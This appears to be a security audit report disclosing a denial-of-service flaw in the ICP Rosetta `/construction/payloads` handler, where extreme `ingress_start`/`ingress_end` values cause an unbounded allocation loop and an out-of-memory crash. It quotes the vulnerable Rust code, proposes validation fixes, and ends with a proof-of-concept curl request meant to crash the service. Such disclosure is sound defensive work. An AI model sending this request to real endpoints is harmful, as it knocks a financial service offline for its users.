Audit Report

## Title
Unbounded ingress-expiry allocation loop in ICP Rosetta `/construction/payloads` causes OOM crash — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

## Summary

The `construction_payloads` handler in ICP Rosetta accepts attacker-controlled `ingress_start` and `ingress_end` u64 nanosecond timestamps with no range or window-size validation. A single unauthenticated HTTP POST supplying `ingress_start=0` and `ingress_end=u64::MAX` drives an unbounded `while now < ingress_end` loop that pushes entries into a `Vec` until the process is OOM-killed. The `Time::add_assign` implementation silently truncates on overflow, enabling the loop to wrap and become infinite rather than merely very long.

## Finding Description

**Interval computation** at lines 59–60 of `construction_payloads.rs`:

```rust
let interval =
    ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

`MAX_INGRESS_TTL` (300 s) − `PERMITTED_DRIFT` (60 s) − 120 s = **120 s = 120,000,000,000 ns**. [1](#0-0) 

**The unguarded loop** at lines 99–107:

```rust
let mut ingress_expiries = vec![];
let mut now = ingress_start;
while now < ingress_end {
    let ingress_expiry = (now + ...).as_nanos_since_unix_epoch();
    ingress_expiries.push(ingress_expiry);
    now += interval;
}
```

No check on `ingress_start >= ingress_end`, no cap on the window size, and no iteration limit. [2](#0-1) 

**Overflow/wrap in `Time::add_assign`** (lines 55–58 of `time.rs`):

```rust
impl std::ops::AddAssign<Duration> for Time {
    fn add_assign(&mut self, other: Duration) {
        *self = Time::from_duration(Duration::from_nanos(self.0) + other)
    }
```

`from_duration` casts the `u128` result of `Duration::as_nanos()` back to `u64` via `as u64`, which silently truncates. [3](#0-2) [4](#0-3) 

With `ingress_start=0` and `ingress_end=u64::MAX`:
- Iterations before first u64 wrap: `u64::MAX / 120_000_000_000 ≈ 153 billion`
- Memory per iteration: 8 bytes (one `u64` pushed to `ingress_expiries`)
- Total allocation before wrap: ~1.2 TB → process is OOM-killed far earlier
- After wrap, `now` resets to a small value; since `ingress_end = u64::MAX`, `now < ingress_end` is true again → **infinite loop**

**No guards exist in the ICP handler.** The ICRC1 counterpart at lines 148–158 of `services.rs` has explicit validation:

```rust
if ingress_start >= ingress_end {
    return Err(...);
}
if ingress_end < now + ingress_interval {
    return Err(...);
}
``` [5](#0-4) 

The `ConstructionPayloadsRequestMetadata` struct accepts `ingress_start` and `ingress_end` as plain `Option<u64>` with no range validation at deserialization time, and the 4 MB JSON body limit does not protect against this attack since the malicious payload is a few dozen bytes. [6](#0-5) 

## Impact Explanation

An unauthenticated attacker sends a single HTTP POST to `/construction/payloads`. The Rosetta process enters an effectively infinite allocation loop and is OOM-killed by the OS. The ICP Rosetta service becomes unavailable until manually restarted. Repeated requests prevent recovery. This is a concrete **application/platform-level DoS** of a financial integration component (ICP Rosetta API), matching the High ($2,000–$10,000) impact class: *"Application/platform-level DoS, crash, consensus blocking, certified-state disruption, or subnet availability impact not based on raw volumetric DDoS"* and *"Significant Chain Fusion, ck-token, ledger, Rosetta, boundary/API … security impact with concrete user or protocol harm."*

## Likelihood Explanation

The endpoint is publicly reachable with no authentication. The attack payload is a standard Rosetta JSON body of ~400 bytes. The vulnerable code path is exercised on every call that supplies metadata. No privileged access, no key material, and no IC-protocol interaction is required. The ICRC1 sibling already demonstrates the correct fix, confirming the ICP handler was never updated with the same guard. The attack is trivially repeatable to prevent service recovery.

## Recommendation

Add window-size validation immediately after `ingress_start`/`ingress_end` are resolved (mirroring the ICRC1 guards), and cap the maximum ingress window:

```rust
if ingress_start >= ingress_end {
    return Err(ApiError::invalid_request(
        "ingress_start must be strictly before ingress_end",
    ));
}
let max_window = Duration::from_secs(24 * 3600);
if ingress_end > ingress_start + max_window {
    return Err(ApiError::invalid_request(
        "ingress window exceeds maximum allowed duration",
    ));
}
```

Additionally, replace the unchecked `now += interval` with `now.checked_add(interval).ok_or(...)` to eliminate the silent u64 truncation in `Time::add_assign`.

## Proof of Concept

```bash
curl -s -X POST http://<rosetta-host>:8080/construction/payloads \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Internet Computer","network":"00000000000000020101"},
    "operations": [{"operation_identifier":{"index":0},"type":"TRANSACTION",
      "account":{"address":"<valid-account>"},
      "amount":{"value":"-100","currency":{"symbol":"ICP","decimals":8}}}],
    "public_keys": [{"hex_bytes":"<valid-pubkey>","curve_type":"edwards25519"}],
    "metadata": {
      "ingress_start": 0,
      "ingress_end": 18446744073709551615
    }
  }'
# Rosetta process OOM-killed; subsequent requests return connection refused.
```

A deterministic unit test can confirm the bug without OOM by asserting that calling `construction_payloads` with `ingress_start=0` and `ingress_end=u64::MAX` returns an `Err` (after the fix) or hangs/panics (before the fix, using a bounded iteration count in a test harness).
